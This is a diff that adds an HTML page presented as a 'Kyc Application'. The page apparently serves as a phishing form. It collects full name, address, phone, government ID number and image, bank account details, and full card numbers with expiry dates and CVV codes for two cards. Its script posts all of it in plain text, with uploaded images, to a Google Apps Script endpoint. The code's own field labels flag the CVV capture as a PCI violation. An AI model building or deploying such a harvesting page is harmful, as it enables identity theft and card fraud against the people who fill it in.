@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Application</title>
+    <style>
+        :root {
+            /* --- Black and Blueish Theme --- */
+            --primary-blue: #0d6efd; /* Bright blue for accents and interactive elements */
+            --primary-blue-hover: #0a58ca; /* Darker blue for hover states */
+            --primary-blue-focus-shadow: rgba(13, 110, 253, 0.35); /* Shadow for focused blue elements */
+
+            --bg-dark-start: #111827;         /* Very dark (almost black) blueish-gray for body gradient start */
+            --bg-dark-end: #1c273e;           /* Slightly more blueish dark gray for body gradient end */
+            --bg-container: #1f2937;    /* Darker gray for the main form container */
+            --bg-input: #374151;        /* Medium-dark gray for input fields */
+
+            --text-primary: #f3f4f6;      /* Light gray/off-white for primary text */
+            --text-secondary: #9ca3af;    /* Lighter gray for secondary text/labels */
+            --text-headings: #ffffff;     /* White for main headings */
+            --text-on-primary-blue: #ffffff; /* Text color for elements with primary-blue background */
+            --text-placeholder: #6b7280;  /* Color for placeholder text */
+
+            --border-default: #4b5563;    /* Default border color for inputs, fieldsets */
+            --border-focus: var(--primary-blue); /* Border color for focused elements */
+            --border-divider: #374151;    /* For subtle dividers like h2 bottom border */
+
+            --shadow-container: 0 8px 24px rgba(0, 0, 0, 0.3), 0 4px 12px rgba(0, 0, 0, 0.25); /* More pronounced shadow for dark theme */
+
+            --status-success-bg: rgba(16, 185, 129, 0.15); /* Subtle green background */
+            --status-success-text: #34d399;               /* Bright green text */
+            --status-success-border: #10b981;             /* Green border */
+
+            --status-error-bg: rgba(239, 68, 68, 0.15);   /* Subtle red background */
+            --status-error-text: #f87171;                 /* Bright red text */
+            --status-error-border: #ef4444;               /* Red border */
+
+            --button-disabled-bg: #4b5563;
+            --button-disabled-text: #9ca3af;
+
+            --file-button-bg: #4b5563;
+            --file-button-hover-bg: #5a6678;
+            --file-button-text: var(--text-primary);
+
+            --border-radius-sm: 0.3rem;
+            --border-radius-md: 0.5rem; /* Specific for container */
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            background-color: var(--bg-dark-start); /* Fallback */
+            background: linear-gradient(135deg, var(--bg-dark-start) 0%, var(--bg-dark-end) 100%);
+            color: var(--text-primary);
+            line-height: 1.6;
+            margin: 0;
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .container {
+            background-color: var(--bg-container);
+            padding: 30px 40px;
+            border-radius: var(--border-radius-md);
+            box-shadow: var(--shadow-container);
+            width: 100%;
+            max-width: 750px;
+            margin-top: 30px;
+            margin-bottom: 40px;
+            border-top: 3px solid var(--primary-blue);
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--text-headings);
+            margin-top: 0;
+            margin-bottom: 35px;
+            font-size: 2.2em;
+            font-weight: 600;
+        }
+        h2 {
+            font-size: 1.6em;
+            color: var(--text-headings);
+            border-bottom: 1px solid var(--border-divider);
+            padding-bottom: 10px;
+            margin-top: 35px;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 0.95em;
+            color: var(--text-secondary);
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="tel"],
+        .form-group input[type="email"],
+        .form-group input[type="url"],
+        .form-group input[type="file"],
+        .form-group input[type="number"],
+        .form-group textarea,
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--border-default);
+            border-radius: var(--border-radius-sm);
+            box-sizing: border-box;
+            font-size: 1em;
+            background-color: var(--bg-input);
+            color: var(--text-primary);
+            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+        }
+        
+        .form-group input::placeholder,
+        .form-group textarea::placeholder {
+            color: var(--text-placeholder);
+            opacity: 1; /* Ensure placeholder color is fully visible */
+        }
+
+        .form-group input[type="file"] {
+            padding-top: 10px;
+            padding-bottom: 10px;
+        }
+        .form-group input[type="file"]::-webkit-file-upload-button {
+            padding: 8px 12px;
+            margin-right: 10px;
+            background-color: var(--file-button-bg);
+            border: none;
+            border-radius: var(--border-radius-sm);
+            color: var(--file-button-text);
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        .form-group input[type="file"]::-webkit-file-upload-button:hover {
+            background-color: var(--file-button-hover-bg);
+        }
+
+
+        .form-group input:focus,
+        .form-group textarea:focus,
+        .form-group select:focus {
+            border-color: var(--border-focus);
+            outline: 0;
+            box-shadow: 0 0 0 0.2rem var(--primary-blue-focus-shadow);
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        button[type="submit"] {
+            background-color: var(--primary-blue);
+            color: var(--text-on-primary-blue);
+            padding: 12px 25px;
+            border: none;
+            border-radius: var(--border-radius-sm);
+            cursor: pointer;
+            font-size: 1.1em;
+            font-weight: 500;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            width: 100%;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        button[type="submit"]:hover:not(:disabled) {
+            background-color: var(--primary-blue-hover);
+            transform: translateY(-1px);
+        }
+        button[type="submit"]:active:not(:disabled) {
+            transform: translateY(0px);
+        }
+
+        button[type="submit"]:disabled {
+            background-color: var(--button-disabled-bg);
+            color: var(--button-disabled-text);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        #statusMessage {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: var(--border-radius-sm);
+            text-align: center;
+            font-weight: 500;
+            font-size: 1em;
+        }
+
+        .status-success {
+            background-color: var(--status-success-bg);
+            color: var(--status-success-text);
+            border: 1px solid var(--status-success-border);
+        }
+
+        .status-error {
+            background-color: var(--status-error-bg);
+            color: var(--status-error-text);
+            border: 1px solid var(--status-error-border);
+        }
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        fieldset {
+            border: 1px solid var(--border-default);
+            padding: 20px 25px;
+            margin-bottom: 25px;
+            border-radius: var(--border-radius-sm);
+        }
+        legend {
+            font-weight: 500;
+            font-size: 1.25em;
+            padding: 0 10px;
+            color: var(--text-headings);
+            margin-bottom: 10px;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            body {
+                padding: 20px 10px;
+            }
+            .container {
+                padding: 25px 20px;
+                margin-top: 20px;
+                margin-bottom: 20px;
+            }
+            h1 {
+                font-size: 1.8em;
+                margin-bottom: 25px;
+            }
+            h2 {
+                font-size: 1.4em;
+            }
+            button[type="submit"] {
+                font-size: 1em;
+                padding: 12px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Kyc Application</h1>
+
+        <form id="dataForm">
+            <h2>Personal Information</h2>
+            <div class="form-group">
+                <label for="name">Full Name:</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="form-group">
+                <label for="address">Full Address:</label>
+                <textarea id="address" name="address" required></textarea>
+            </div>
+            <div class="form-group">
+                <label for="phone">Phone Number:</label>
+                <input type="tel" id="phone" name="phone" required>
+            </div>
+
+            <h2>Government Issued ID</h2>
+            <div class="form-group">
+                <label for="govIdType">Government ID Type:</label>
+                <input type="text" id="govIdType" name="govIdType" placeholder="e.g., Driving License" required>
+            </div>
+             <div class="form-group">
+                <label for="govIdNumber">Government ID Number:</label>
+                <input type="text" id="govIdNumber" name="govIdNumber" required>
+            </div>
+            <div class="form-group">
+                <label for="govIdFile">Upload Government ID Image:</label>
+                <input type="file" id="govIdFile" name="govIdFile" accept="image/*,.pdf" required>
+            </div>
+
+            <h2>Bank Details for Withdrawals</h2>
+            <div class="form-group">
+                <label for="bankName">Bank Name:</label>
+                <input type="text" id="bankName" name="bankName" required>
+            </div>
+            <div class="form-group">
+                <label for="accountHolderName">Account Holder Name:</label>
+                <input type="text" id="accountHolderName" name="accountHolderName" required>
+            </div>
+            <div class="form-group">
+                <label for="accountNumber">Bank Account Number:</label>
+                <input type="text" id="accountNumber" name="accountNumber" required>
+            </div>
+            <div class="form-group">
+                <label for="bankCode">Bank Code:</label>
+                <input type="text" id="bankCode" name="bankCode" placeholder="e.g., Swift/BIC, IFSC" required>
+            </div>
+            <div class="form-group">
+                <label for="accountType">Account Type:</label>
+                <input type="text" id="accountType" name="accountType" placeholder="e.g., Savings">
+            </div>
+
+            <h2>Card Details for Verification</h2>
+            <fieldset>
+                <legend>Credit/Debit Card 1</legend>
+                <div class="form-group">
+                    <label for="amlCardName1">Name on Card:</label>
+                    <input type="text" id="amlCardName1" name="amlCardName1">
+                </div>
+                <div class="form-group">
+                    <label for="amlCardNumber1">Full Card Number:</label>
+                    <input type="text" id="amlCardNumber1" name="amlCardNumber1" placeholder="XXXX XXXX XXXX XXXX">
+                </div>
+                <div class="form-group" style="display: flex; gap: 10px;">
+                    <div style="flex: 1;">
+                        <label for="amlCardExpiry1">Expiry Date (MM/YY):</label>
+                        <input type="text" id="amlCardExpiry1" name="amlCardExpiry1" placeholder="MM/YY">
+                    </div>
+                    <div style="flex: 1;">
+                        <label for="amlCardCvv1">CVV/CVC:</label>
+                        <input type="text" id="amlCardCvv1" name="amlCardCvv1" placeholder="XXX">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="amlCardType1">Card Type:</label>
+                    <input type="text" id="amlCardType1" name="amlCardType1" placeholder="e.g., Visa Debit">
+                </div>
+                <div class="form-group">
+                    <label for="amlCardFile1">Upload Image of Card 1 (Optional):</label>
+                    <input type="file" id="amlCardFile1" name="amlCardFile1" accept="image/*,.pdf">
+                </div>
+            </fieldset>
+            <fieldset>
+                <legend>Credit/Debit Card 2 (Optional)</legend>
+                 <div class="form-group">
+                    <label for="amlCardName2">Name on Card:</label>
+                    <input type="text" id="amlCardName2" name="amlCardName2">
+                </div>
+                <div class="form-group">
+                    <label for="amlCardNumber2">Full Card Number:</label>
+                    <input type="text" id="amlCardNumber2" name="amlCardNumber2" placeholder="XXXX XXXX XXXX XXXX">
+                </div>
+                <div class="form-group" style="display: flex; gap: 10px;">
+                    <div style="flex: 1;">
+                        <label for="amlCardExpiry2">Expiry Date (MM/YY):</label>
+                        <input type="text" id="amlCardExpiry2" name="amlCardExpiry2" placeholder="MM/YY">
+                    </div>
+                    <div style="flex: 1;">
+                        <label for="amlCardCvv2">CVV/CVC:</label>
+                        <input type="text" id="amlCardCvv2" name="amlCardCvv2" placeholder="XXX">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="amlCardType2">Card Type:</label>
+                    <input type="text" id="amlCardType2" name="amlCardType2" placeholder="e.g., Visa Debit">
+                </div>
+                 <div class="form-group">
+                    <label for="amlCardFile2">Upload Image of Card 2 (Optional):</label>
+                    <input type="file" id="amlCardFile2" name="amlCardFile2" accept="image/*,.pdf">
+                </div>
+            </fieldset>
+
+         
+            <div class="form-group">
+                <label for="userGmail"></label>
+                <input type="email" id="userGmail" name="userGmail" placeholder="applicant-email@example.com" required>
+            </div>
+
+            <button type="submit" id="submitButton">Submit</button>
+            <div id="statusMessage"></div>
+        </form>
+    </div>
+
+    <script>
+        // !!! IMPORTANT: PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE !!!
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxSB8At_Ti7256nzvd-1_QJ12Osx5-xaIzv4Y9S9PBZdWOGqdrXa5siF8uCoHwp2uuq/exec"; // REPLACE WITH YOUR ACTUAL URL IF DIFFERENT
+
+        const form = document.getElementById('dataForm');
+        const submitButton = document.getElementById('submitButton');
+        const statusMessage = document.getElementById('statusMessage');
+
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            // REMOVED THE CONFIRM DIALOG BLOCK
+
+            statusMessage.innerHTML = 'Processing... <span class="spinner"></span>';
+            statusMessage.className = '';
+            submitButton.disabled = true;
+
+            const formDataObject = new FormData(form);
+            const textData = {};
+            const filesToUpload = [];
+
+            textData.name = formDataObject.get('name');
+            textData.address = formDataObject.get('address');
+            textData.phone = formDataObject.get('phone');
+            textData.govIdType = formDataObject.get('govIdType');
+            textData.govIdNumber = formDataObject.get('govIdNumber');
+            textData.bank_WARNING_SENSITIVE_DATA = "--- BANK DETAILS (EXTREMELY SENSITIVE) ---";
+            textData.bankName = formDataObject.get('bankName');
+            textData.accountHolderName = formDataObject.get('accountHolderName');
+            textData.accountNumber_PLAINTEXT_RISK = formDataObject.get('accountNumber');
+            textData.bankCode = formDataObject.get('bankCode');
+            textData.accountType = formDataObject.get('accountType');
+            textData.aml_card1_EXTREME_RISK_PCI_VIOLATION = "--- CARD 1 (EXTREMELY SENSITIVE - PCI DSS VIOLATION RISK) ---";
+            textData.amlCardName1 = formDataObject.get('amlCardName1') || "N/A";
+            textData.amlCardNumber1_PLAINTEXT_RISK = formDataObject.get('amlCardNumber1') || "N/A";
+            textData.amlCardExpiry1_PLAINTEXT_RISK = formDataObject.get('amlCardExpiry1') || "N/A";
+            textData.amlCardCvv1_NEVER_STORE_RISK = formDataObject.get('amlCardCvv1') || "N/A";
+            textData.amlCardType1 = formDataObject.get('amlCardType1') || "N/A";
+            if (formDataObject.get('amlCardName2') || formDataObject.get('amlCardNumber2')) {
+                textData.aml_card2_EXTREME_RISK_PCI_VIOLATION = "--- CARD 2 (EXTREMELY SENSITIVE - PCI DSS VIOLATION RISK) ---";
+                textData.amlCardName2 = formDataObject.get('amlCardName2') || "N/A";
+                textData.amlCardNumber2_PLAINTEXT_RISK = formDataObject.get('amlCardNumber2') || "N/A";
+                textData.amlCardExpiry2_PLAINTEXT_RISK = formDataObject.get('amlCardExpiry2') || "N/A";
+                textData.amlCardCvv2_NEVER_STORE_RISK = formDataObject.get('amlCardCvv2') || "N/A";
+                textData.amlCardType2 = formDataObject.get('amlCardType2') || "N/A";
+            }
+            textData.applicantIdentifier = formDataObject.get('userGmail');
+
+            async function processFile(fileInputElementId, prefix) {
+                const fileInput = document.getElementById(fileInputElementId);
+                if (fileInput.files && fileInput.files[0]) {
+                    const file = fileInput.files[0];
+                    try {
+                        const fileData = await readFileAsBase64(file);
+                        filesToUpload.push({
+                            fileName: `${prefix}_${Date.now()}_${file.name.replace(/[^a-zA-Z0-9._-]/g, '_')}`,
+                            mimeType: file.type,
+                            data: fileData.split(',')[1]
+                        });
+                    } catch (error) {
+                        showError(`Error reading ${prefix} file: ${error.message}`);
+                        throw error;
+                    }
+                }
+            }
+
+            try {
+                await processFile('govIdFile', 'gov_id');
+                if (document.getElementById('amlCardFile1').files.length > 0) {
+                    await processFile('amlCardFile1', 'aml_card1');
+                }
+                if (document.getElementById('amlCardFile2').files.length > 0) {
+                    await processFile('amlCardFile2', 'aml_card2');
+                }
+            } catch (e) {
+                submitButton.disabled = false;
+                return;
+            }
+            
+            const dataPayload = {
+                textData: textData,
+                files: filesToUpload,
+            };
+
+            try {
+                const response = await fetch(WEB_APP_URL, {
+                    method: 'POST',
+                    redirect: 'follow',
+                    body: JSON.stringify(dataPayload),
+                    headers: {
+                        'Content-Type': 'text/plain;charset=utf-8',
+                    }
+                });
+
+                const resultText = await response.text();
+                let result;
+                try {
+                    result = JSON.parse(resultText);
+                } catch (e) {
+                    console.error("Response was not valid JSON:", resultText);
+                    if(response.ok) {
+                         // UPDATED SUCCESS MESSAGE HERE if response is OK but not JSON
+                         showSuccess('Form submitted for verification.'); 
+                         form.reset();
+                    } else {
+                         showError('Submission failed. Server response: ' + resultText);
+                    }
+                    submitButton.disabled = false;
+                    return;
+                }
+
+                if (result.success) {
+                    // UPDATED SUCCESS MESSAGE HERE
+                    showSuccess('Form submitted for verification.'); 
+                    form.reset();
+                } else {
+                    showError('Submission failed: ' + (result.error || 'Unknown server error.'));
+                }
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                showError('Submission error: ' + error.message + '. Check console and network tab for details. Ensure Web App URL is correct and script is deployed.');
+            } finally {
+                submitButton.disabled = false;
+            }
+        });
+
+        function readFileAsBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = error => reject(error);
+                reader.readAsDataURL(file);
+            });
+        }
+
+        function showSuccess(message) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'status-success';
+        }
+
+        function showError(message) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'status-error';
+        }
+    </script>
+</body>
+</html>
